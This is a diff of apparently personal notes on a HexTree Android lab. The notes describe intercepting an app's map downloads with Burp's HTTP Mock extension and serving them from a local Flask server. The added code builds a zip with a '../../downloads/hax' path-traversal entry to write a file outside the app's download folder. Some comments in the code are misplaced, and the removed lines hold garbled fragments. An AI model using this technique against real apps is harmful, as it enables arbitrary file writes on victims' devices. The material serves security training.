@@ -41,50 +41,56 @@ head over to Burp and see the two important requests.
 - One loads the available maps 
 - the other is the GHZ zip archive download. 
 
-And keep in mind, our goal is to attack this app by simulating a machine in the middle attacker who can manipulate the clear text request or responses. Of course, we could simply intercept the traffic with [[burpsuite]] or even use match and replace rules, but all of that fails once we try to handle binary data such as the zip file 
+And keep in mind, our goal is to attack this app by simulating a machine in the middle attacker who can manipulate the clear text request or responses. Of course, we could simply intercept the traffic with [[burpsuite]] or even use match and replace rules, but all of that fails once we try to handle binary data such as the zip file.
 #### Install HTTP mock extension 
 
 First, I'm going to Install a burp extension called HTTP Mock. This extension gives us a lot more freedom in the way how we can change and manipulate the responses to certain requests.
 
-To do that, we can right click our URLs and select extension HTTP mock - -> mock HTTP response and send these details over to the extension. Over there. We can now change the details.
+To do that, we can right click our URLs and select extension HTTP mock - -> mock HTTP response and send these details over to the extension. 
 
-Here we have the mock rules using regular expressions. Different parts of the requests are matched. Basically it works this way.
+Here we have the mock rules using regular expressions. Different parts of the requests are matched. Basically it works this way. If a request is coming into Burp, it will check the host, the port, the method, and even the file path. And if it matches, then respond with this data instead. 
 
-If a request is coming into Burp, it will check the host, the port, the method, and even the file path.
+But we are going one step further. Now we are actually going to use the redirect to URL feature (bottom of the page) set to Basic by default.  to send the request to another web server. 
 
-And if it matches, then respond with this data instead. But we are going one step further. Now we are actually going to use the redirect to URL feature
+replace the contents of the response to `http://127.0.0.1:1234/map.json`
+we are actually sending a request to this Local server, URL, I'm also removing part of the URL matching in order to match any file that we download (append `/.*`)
+change some other fields (eg. change host & Port to `.*`) so they match anything. This way we can make sure our rules really get applied to all the incoming requests.
 
-to send the request to another web server. This gives us extreme flexibility. So when we request the map JSON data,
 
-we are actually sending a request to this Local server, URL, and if we match any of the map download request,
 
-I'm also removing part of the URL matching in order to match any file that we download. Then we are going to request the zip file from this
+```python
+from flask import Flask, jsonify, send_file
+import zipfile, io
 
-local server, URL. Also, I'm changing some other fields here so they match anything. This way we can make sure our rules really get applied to all the incoming requests. Okay, now we specify that we wanna forward the request to this local server, URL,
+app = Flask(__name__)
 
-and this local server doesn't exist yet, so let's create that next. I'm using Python for this with the flash framework
+@app.route('/map.json')
+def serve_map():
+    # This is where you would define the JSON response or fetch it from a file or database
+# to confirm here that our custom request redirection worked. We are only seeing one app exactly as we have specified in our fake server.
+    response = {
+        "maps-0.13.0_0-path": "maps",
+        "maps-0.13.0_0":
+        [
+            { 
+                "name": "hextree-android_continent", 
+                "size": "812K", "time": "2024-02" },
+        ]
+    }
+    return jsonify(response)
 
-because I think it's pretty simple. Then we create two routes, one that responds to the map JSON request and one to the map zip download request.
+@app.route('/map.zip')
+def map_archive():
+# create a malicious zip file that leads to an arbitrary file. Specifically try to write the hex file into the pocket maps download folder.
+    buffer = io.BytesIO()
+    with zipfile.ZipFile(buffer, 'w') as zipf:
+        zipf.writestr('../../downloads/hax','test path traversal')
+    buffer.seek(0)
+    return send_file(buffer, as_attachment=True,download_name='map.ghz')
 
-Here we can retum some malicious map files that we could download if we want. And here we now have to return the malicious zip file.
-
-But first, let's test this code. We run the server and it'll listen. Now on port 1, 2, 3, 4,
-
-and back on Android, we are restarting the app and load again the list of maps. And if the setup is correct, we should be able
-
-n
-
-s
-
-th
-
-to confirm here that our custom request redirection worked. We are only seeing one app exactly as we have specified in our fake server.
-
-But now the big question, what about the zip file? Well, this is now your part. Implement the code here to create a malicious zip file
-
-that leads to an arbitrary file, right? Specifically try to write the hex file into the pocket maps download folder.
-
-If you succeed to write this Hex file, the app will show you the flag to solve this lab.
+if __name__ == '__main__':
+    app.run(debug=True, port=1234)
+```
 
 ### References
 [Static vs. Dynamic Analysis](https://app.hextree.io/courses/network-interception/case-study-pockethexmap)
